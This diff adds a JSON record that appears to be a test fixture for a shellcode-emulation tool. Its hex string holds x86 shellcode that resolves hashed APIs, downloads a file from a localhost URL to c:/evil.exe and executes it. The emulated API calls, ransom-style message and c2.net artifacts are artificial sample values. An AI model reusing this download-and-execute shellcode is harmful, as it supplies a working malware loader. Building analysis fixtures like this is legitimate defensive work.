+      "strlit": "\\x4c\\x01\\x01\\x00\\xb8\\xda\\x47\\x60\\x82\\x03\\x00\\x00\\x21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x2e\\x74\\x65\\x78\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc4\\x02\\x00\\x00\\x3c\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x0d\\x00\\x00\\x00\\x20\\x00\\x50\\x60\\xe8\\x00\\x00\\x00\\x00\\x5a\\x8d\\x52\\xfb\\x89\\xe5\\x81\\xec\\x00\\x10\\x00\\x00\\x52\\xbb\\x8e\\xfe\\x1f\\x4b\\xe8\\xbe\\x00\\x00\\x00\\x5a\\x55\\x52\\x89\\xc5\\x8d\\xb2\\x4f\\x02\\x00\\x00\\x8d\\xba\\x5b\\x02\\x00\\x00\\xe8\\xfe\\x00\\x00\\x00\\x5a\\x5d\\x55\\x52\\x8d\\xb2\\x19\\x02\\x00\\x00\\x56\\xff\\xb2\\x5f\\x02\\x00\\x00\\x58\\xff\\xd0\\x5a\\x5d\\x90\\x90\\xd9\\xfa\\x90\\x90\\xd9\\x74\\x24\\x04\\x55\\x52\\x89\\xc5\\x8d\\xb2\\x63\\x02\\x00\\x00\\x8d\\xba\\x6b\\x02\\x00\\x00\\xe8\\xc9\\x00\\x00\\x00\\x5a\\x5d\\x9b\\xd9\\x71\\x0c\\xd9\\x75\\x07\\x55\\x52\\x6a\\x00\\x6a\\x00\\x8d\\xb2\\x24\\x02\\x00\\x00\\x56\\x8d\\xb2\\x30\\x02\\x00\\x00\\x56\\x6a\\x00\\xff\\xb2\\x6b\\x02\\x00\\x00\\x58\\xff\\xd0\\x5a\\x5d\\xd9\\xfa\\x90\\x90\\x90\\x90\\x9b\\xd9\\x74\\x24\\x04\\x55\\x52\\x8d\\xb2\\x6f\\x02\\x00\\x00\\x56\\x8d\\xb2\\x7f\\x02\\x00\\x00\\x56\\x6a\\x00\\x6a\\x00\\x6a\\x00\\x6a\\x00\\x6a\\x00\\x6a\\x00\\x8d\\xb2\\x24\\x02\\x00\\x00\\x56\\x6a\\x00\\xff\\xb2\\x5b\\x02\\x00\\x00\\x58\\xff\\xd0\\x5a\\x5d\\xc3\\xd9\\xeb\\xb8\\x42\\x00\\x00\\x00\\x83\\xc0\\x20\\x9b\\xd9\\x30\\xfc\\x31\\xff\\x64\\x8b\\x3d\\x30\\x00\\x00\\x00\\x8b\\x7f\\x0c\\xeb\\x08\\x8b\\x7f\\x14\\x8b\\x77\\x28\\x31\\xd2\\x66\\xad\\x84\\xc0\\x74\\x11\\x3c\\x41\\x72\\x06\\x3c\\x5a\\x77\\x02\\x0c\\x20\\xc1\\xc2\\x07\\x30\\xc2\\xeb\\xe9\\x39\\xda\\x8b\\x47\\x10\\x8b\\x3f\\x31\\xdb\\x31\\xc3\\x6a\\x26\\x58\\x31\\xc9\\x53\\x64\\xff\\x15\\xc0\\x00\\x00\\x00\\x89\\xc1\\x83\\xe9\\x0b\\x51\\x64\\xff\\x15\\xc0\\x00\\x00\\x00\\x75\\xbd\\xc3\\x89\\xea\\x03\\x52\\x3c\\x8b\\x52\\x78\\x01\\xea\\x8b\\x5a\\x20\\x6a\\x13\\x59\\xb8\\x13\\x00\\x00\\x00\\x01\\xc8\\x64\\xff\\x15\\xc0\\x00\\x00\\x00\\x01\\xeb\\x31\\xc9\\x57\\x56\\x8b\\x36\\x8b\\x3b\\x01\\xef\\x52\\x31\\xd2\\xc1\\xc2\\x07\\x32\\x17\\x47\\x80\\x3f\\x00\\x75\\xf5\\x52\\xc3\\x6a\\x33\\x68\\xef\\xbe\\xaf\\xde\\xcb\\x52\\xc3\\x53\\xc3\\xea\\x78\\x56\\x34\\x12\\x33\\x00\\x92\\x5a\\x39\\xf0\\x74\\x19\\x83\\xc3\\x04\\x41\\x39\\x4a\\x18\\x75\\xca\\x5e\\x5f\\xe8\\x00\\x00\\x00\\x00\\x58\\x9a\\x00\\x00\\x31\\x12\\x33\\x00\\xc3\\x5e\\x5f\\xad\\x56\\x64\\x8b\\x68\\x30\\x8b\\x7f\\x0c\\x8b\\x7f\\x14\\xad\\x53\\xc3\\x6a\\x33\\x68\\x11\\x11\\x11\\x11\\xcb\\x52\\xc3\\xea\\xef\\xbe\\xad\\xde\\x33\\x00\\x89\\xeb\\x89\\xde\\x03\\x5a\\x24\\x8d\\x04\\x4b\\x0f\\xb7\\x00\\x6a\\x26\\x58\\x83\\xc0\\x14\\x31\\xdb\\x01\\xc3\\x89\\xda\\x29\\xc2\\x52\\x9a\\xde\\xc0\\x37\\x13\\x33\\x00\\x64\\xff\\x15\\xc0\\x00\\x00\\x00\\x8d\\x04\\x86\\x03\\x42\\x1c\\x8b\\x00\\x01\\xf0\\xab\\xe8\\x0b\\x00\\x00\\x00\\x83\\xc0\\x03\\x6a\\x33\\x68\\x00\\x10\\x40\\x00\\xcb\\x5b\\x5b\\x53\\xc3\\x5e\\x83\\xc3\\x04\\x41\\x81\\x3e\\xff\\xff\\x00\\x00\\x0f\\x85\\x3a\\xff\\xff\\xff\\xc3\\x75\\x72\\x6c\\x6d\\x6f\\x6e\\x2e\\x64\\x6c\\x6c\\x00\\x63\\x3a\\x2f\\x65\\x76\\x69\\x6c\\x2e\\x65\\x78\\x65\\x00\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x31\\x32\\x37\\x2e\\x30\\x2e\\x30\\x2e\\x31\\x3a\\x38\\x30\\x38\\x30\\x2f\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\\xc7\\x8a\\x31\\x46\\x26\\x80\\xac\\xc8\\xff\\xff\\x00\\x00\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x99\\x23\\x5d\\xd9\\xff\\xff\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x23\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\x29\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\x38\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\x3f\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\x58\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\x5e\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\x78\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\x7f\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\x88\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\xa0\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\xa7\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\xba\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\xc3\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\x2e\\x66\\x69\\x6c\\x65\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xfe\\xff\\x00\\x00\\x67\\x01\\x77\\x6f\\x72\\x6b\\x2e\\x61\\x73\\x6d\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x2e\\x74\\x65\\x78\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x03\\x01\\xc4\\x02\\x00\\x00\\x0d\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x2e\\x61\\x62\\x73\\x6f\\x6c\\x75\\x74\\x00\\x00\\x00\\x00\\xff\\xff\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x67\\x65\\x74\\x65\\x69\\x70\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x13\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x26\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x37\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x48\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x57\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x6c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x7c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x8a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x98\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\xa9\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\xb3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\xc1\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x55\\x52\\x4c\\x4d\\x4f\\x4e\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x50\\x41\\x54\\x48\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\xcb\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\xd5\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\xe7\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\xfe\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x16\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x2b\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x3b\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x50\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x69\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x7d\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x89\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x40\\x66\\x65\\x61\\x74\\x2e\\x30\\x30\\x01\\x00\\x00\\x00\\xff\\xff\\x00\\x00\\x03\\x00\\x95\\x01\\x00\\x00\\x6d\\x61\\x69\\x6e\\x65\\x6e\\x74\\x72\\x79\\x70\\x6f\\x69\\x6e\\x74\\x00\\x67\\x65\\x74\\x5f\\x6d\\x6f\\x64\\x75\\x6c\\x65\\x5f\\x61\\x64\\x64\\x72\\x65\\x73\\x73\\x00\\x6e\\x65\\x78\\x74\\x5f\\x6d\\x6f\\x64\\x75\\x6c\\x65\\x5f\\x6c\\x6f\\x6f\\x70\\x00\\x6d\\x6f\\x64\\x75\\x6c\\x65\\x5f\\x68\\x61\\x73\\x68\\x5f\\x6c\\x6f\\x6f\\x70\\x00\\x65\\x6e\\x64\\x5f\\x68\\x61\\x73\\x68\\x5f\\x63\\x68\\x65\\x63\\x6b\\x00\\x65\\x6e\\x64\\x5f\\x6d\\x6f\\x64\\x75\\x6c\\x65\\x5f\\x68\\x61\\x73\\x68\\x5f\\x6c\\x6f\\x6f\\x70\\x00\\x67\\x65\\x74\\x5f\\x61\\x70\\x69\\x5f\\x61\\x64\\x64\\x72\\x65\\x73\\x73\\x00\\x6c\\x6f\\x61\\x64\\x5f\\x61\\x70\\x69\\x5f\\x68\\x61\\x73\\x68\\x00\\x6c\\x6f\\x61\\x64\\x5f\\x61\\x70\\x69\\x5f\\x6e\\x61\\x6d\\x65\\x00\\x63\\x72\\x65\\x61\\x74\\x65\\x5f\\x68\\x61\\x73\\x68\\x5f\\x6c\\x6f\\x6f\\x70\\x00\\x63\\x61\\x6c\\x6c\\x70\\x6f\\x70\\x5f\\x31\\x00\\x6c\\x6f\\x61\\x64\\x5f\\x61\\x70\\x69\\x5f\\x61\\x64\\x64\\x79\\x00\\x63\\x61\\x6c\\x6c\\x70\\x6f\\x70\\x5f\\x32\\x00\\x50\\x55\\x54\\x54\\x59\\x5f\\x55\\x52\\x4c\\x00\\x4b\\x45\\x52\\x4e\\x45\\x4c\\x33\\x32\\x48\\x41\\x53\\x48\\x54\\x41\\x42\\x4c\\x45\\x00\\x4b\\x45\\x52\\x4e\\x45\\x4c\\x33\\x32\\x46\\x55\\x4e\\x43\\x54\\x49\\x4f\\x4e\\x53\\x54\\x41\\x42\\x4c\\x45\\x00\\x4b\\x45\\x52\\x4e\\x45\\x4c\\x33\\x32\\x5f\\x43\\x52\\x45\\x41\\x54\\x45\\x50\\x52\\x4f\\x43\\x45\\x53\\x53\\x41\\x00\\x4b\\x45\\x52\\x4e\\x45\\x4c\\x33\\x32\\x5f\\x4c\\x4f\\x41\\x44\\x4c\\x49\\x42\\x52\\x41\\x52\\x59\\x00\\x55\\x52\\x4c\\x4d\\x4f\\x4e\\x48\\x41\\x53\\x48\\x54\\x41\\x42\\x4c\\x45\\x00\\x55\\x52\\x4c\\x4d\\x4f\\x4e\\x46\\x55\\x4e\\x43\\x54\\x49\\x4f\\x4e\\x53\\x54\\x41\\x42\\x4c\\x45\\x00\\x55\\x52\\x4c\\x4d\\x4f\\x4e\\x5f\\x55\\x52\\x4c\\x44\\x4f\\x57\\x4e\\x4c\\x4f\\x41\\x44\\x54\\x4f\\x46\\x49\\x4c\\x45\\x00\\x50\\x52\\x4f\\x43\\x45\\x53\\x53\\x5f\\x49\\x4e\\x46\\x4f\\x52\\x4d\\x41\\x54\\x49\\x4f\\x4e\\x00\\x53\\x54\\x41\\x52\\x54\\x55\\x50\\x49\\x4e\\x46\\x4f\\x00\\x45\\x78\\x69\\x74\\x50\\x72\\x6f\\x63\\x65\\x73\\x73\\x00"
+   },
+   "decoded_stub": "",
+   "emulation": {
+      "api_calls": [
+         {
+            "api_name": "WinExec",
+            "return_value": "0x20",
+            "address": "0x123123",
+            "parameters": [
+               {
+                  "type": "LPCSTR lpCmdLine",
+                  "value": "cmd.exe /c ping google.com > C:\\result.txt"
+               },
+               {
+                  "type": "UINT uCmdShow",
+                  "value": "0x5"
+               }
+            ]
+         },
+         {
+            "api_name": "EncyptFileA",
+            "return_value": "0x20",
+            "address": "0x321321",
+            "parameters": [
+               {
+                  "type": "LPCSTR lpFileName",
+                  "value": "C:\\result.txt"
+               }
+            ]
+         },
+         {
+            "api_name": "LoadLibraryA",
+            "return_value": "0x45664c88",
+            "address": "0x1337c0de",
+            "parameters": [
+               {
+                  "type": "LPCTSTR lpLibFileName",
+                  "value": "user32.dll"
+               }
+            ]
+         },
+         {
+            "api_name": "MessageBoxA",
+            "return_value": "0x20",
+            "address": "0xdeadc0de",
+            "parameters": [
+               {
+                  "type": "HWND hWnd",
+                  "value": "0x987987"
+               },
+               {
+                  "type": "LPCSTR lpText",
+                  "value": "You have been hacked by an elite haxor. Your IP address is now stored in C:\\result.txt but it is encrypted :)cmd.exe /c ping google.com > C:\\result.txt"
+               },
+               {
+                  "type": "LPCSTR lpCaption",
+                  "value": "You have been hacked by an elite haxor. Your IP address is now stored in C:\\result.txt but it is encrypted :)cmd.exe /c ping google.com > C:\\result.txt"
+               },
+               {
+                  "type": "UINT uType",
+                  "value": "0x0"
+               }
+            ]
+         }
+      ],
+      "dlls": [
+         "kernel32",
+         "advapi32",
+         "user32"
+      ],
+      "artifacts": [
+         "c:\\result.txt",
+         "cmd.exe",
+         "google.com",
+         "result.txt",
+         "user32.dll",
+         "calc.exe",
+         "notepad.exe",
+         "www.msn.com",
+         "http://c2.net",
+         "c:\\windows\\system32\\mstsc.exe"
+      ],
+      "web_artifacts": [
+         "google.com",
+         "www.msn.com",
+         "http://c2.net"
+      ],
+      "file_artifacts": [
+         "c:\\result.txt",
+         "cmd.exe",
+         "google.com",
+         "result.txt",
+         "user32.dll",
+         "calc.exe",
+         "notepad.exe",
+         "www.msn.com",
+         "http://c2.net",
+         "c:\\windows\\system32\\mstsc.exe"
+      ],
+      "executable_artifacts": [
+         "cmd.exe",
+         "calc.exe",
+         "notepad.exe",
+         "c:\\windows\\system32\\mstsc.exe"
+      ]
+   }
+}
